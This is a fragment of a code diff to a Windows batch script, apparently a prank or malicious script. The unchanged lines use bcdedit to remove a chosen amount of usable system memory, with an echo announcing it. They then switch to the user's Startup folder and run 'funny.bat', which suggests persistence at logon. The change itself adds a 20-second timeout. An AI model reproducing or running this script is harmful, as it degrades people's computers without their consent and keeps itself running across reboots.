@@ -19,7 +19,7 @@ echo Will be getting rid of %c% bytes of memory
 
 bcdedit.exe /set removememory %c% 
 
-
+TIMEOUT /T 20
 cd "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup"
 funny.bat
  
